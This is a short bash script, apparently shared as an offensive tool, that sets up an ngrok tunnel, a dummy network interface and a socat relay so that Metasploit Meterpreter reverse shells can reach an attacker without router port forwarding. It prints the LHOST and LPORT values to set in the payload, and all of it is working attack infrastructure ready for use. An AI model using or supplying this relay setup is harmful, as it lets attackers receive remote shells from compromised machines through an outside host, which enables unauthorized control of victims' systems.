#!/bin/bash
#Author : Abyss Watcher

echo 'This script will allow you to get meterpreter sessions without port forwaring your router.'
echo 'Just launch ngrok in another terminal and pass the local port as first parameter.'
echo 'Usage : script.sh local_port_used_by_ngrok dummy_interface_name (optional). Ex: 4444 ethngrok'

#Check if packet 'jq' is installed
dpkg -s jq &> /dev/null || { echo "jq packet not found ! Installing it..." ; sudo apt-get install jq; }

#Check if packet 'socat' is installed
dpkg -s socat &> /dev/null || { echo "socat packet not found ! Installing it..." ; sudo apt-get install socat; }

#Get ngrok public url from localhost and parse the json result
get_ngrok_public_url=$(curl -s 127.0.0.1:4040/api/tunnels | jq '.tunnels[0]."public_url"')

#Exit if ngrok is not launched (empty curl output)
if [ -z "$get_ngrok_public_url" ]
then
    echo "ngrok does not seem to be running..." && exit   
fi

#Parse values from json with regex
ngrok_hostname=$(echo $get_ngrok_public_url | grep -oe '[0-9]\{1,2\}[.]tcp[.].\+[.]ngrok[.]io')
ngrok_ip=$(dig +short $ngrok_hostname)
ngrok_port=$(echo $get_ngrok_public_url | grep -oe '[0-9]\{4,5\}')

#Get parameters
local_port=${1?"Please specify the local ngrok port as first parameter."}
int_name=${2:-ethng}

#Create dummy interface and launch socat binder. Delete dummy interface on exit.
sudo ip link add $(echo $int_name) type dummy ;
sudo ip link set $(echo $int_name) up &&
sudo ip addr add $(echo $ngrok_ip)/24 dev $(echo $int_name) &&
echo -e "\nMetasploit payload commands :\nset LHOST $ngrok_ip\nset LPORT $ngrok_port" &&
sudo socat TCP-LISTEN:$(echo $local_port),fork TCP:$(echo $ngrok_ip):$(echo $ngrok_port)
sudo ip link del $(echo $int_name)
